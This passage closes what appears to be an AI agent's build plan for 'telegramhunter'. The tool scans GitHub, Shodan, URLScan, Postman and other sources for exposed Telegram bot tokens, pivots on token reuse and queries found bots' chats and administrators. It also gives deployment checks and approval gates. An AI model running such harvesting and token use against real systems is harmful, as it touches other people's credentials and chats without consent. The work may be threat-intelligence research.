```python
            confidence = 0
            if chat_id: confidence += 30
            if webhook_url: confidence += 20
            if chat_extra.get("chat_member_count", 0) > 10: confidence += 20
            if chat_extra.get("chat_description"): confidence += 10
            # ...etc
```

**Step 3: Persist + commit**

---

# Final cleanup

After all bundles deployed:

1. Verify all containers healthy: `docker ps`
2. Tail logs for 2 minutes, look for errors: `docker logs -f telegramhunter_worker-validators 2>&1 | grep -iE "error|exception"` 
3. Push final state: `git push`
4. Update memory:
   ```
   memory(action='replace', target='memory', old_text='ACTIVE scanners: GitHub multi-token pool',
       content='ACTIVE: 16 sources after May 2026 expansion — GitHub pool, Shodan/C2, URLScan, FOFA, Exa, GrepApp, Gist, Bitbucket, PublicWWW, Netlas, Wayback, Telegram-Search, Common Crawl, Replit, Postman, GitHub Events firehose. PIVOT: token-reuse, bot-username, webhook-host fan-out from validator. ENRICH: getChat, getChatAdministrators. SCORING: confidence_score column. DISABLED: Google CSE, GitLab, Pastebin, Serper.')
   ```

---

# Approval gates

- After Bundle 1: confirm runtime smoke shows pivot tasks firing.
- After Bundle 2: confirm firehose tick is steady at 30s, refresh task is in beat.
- After Bundle 3: confirm 3 new scanners each return non-error response from a live smoke.
- After Bundle 4: confirm migration applied + scores populating.

If any bundle fails its smoke, fix before proceeding to next bundle.
